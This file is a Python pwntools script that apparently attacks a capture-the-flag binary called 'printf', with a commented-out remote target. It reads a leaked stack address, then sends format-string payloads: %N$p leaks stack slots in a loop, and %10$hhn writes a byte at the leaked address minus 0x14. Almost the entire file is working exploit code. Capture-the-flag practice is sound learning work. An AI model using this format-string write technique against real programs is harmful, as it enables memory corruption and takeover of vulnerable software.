from pwn import *

elf = context.binary = ELF("printf")





for i in range(60,99):
    p = process()
    # p = remote("pwn.blitzhack.xyz", 4646)

    p.recvuntil("ve this: ")
    stack_leak = int(p.recvline(),16)

    payload = f"%{i}$p|||".encode() + b"%10$hhn|" + p64(stack_leak - 0x14) 
    p.sendline(payload)
    p.recvuntil("> Here we go!!")
    A = p.recvuntil("|||").strip()[:-3]
    print(i,A)

    # if A.endswith(b"90"):
    #     gdb.attach(p)
    #     p.interactive()
    #     exit()
    
    p.close()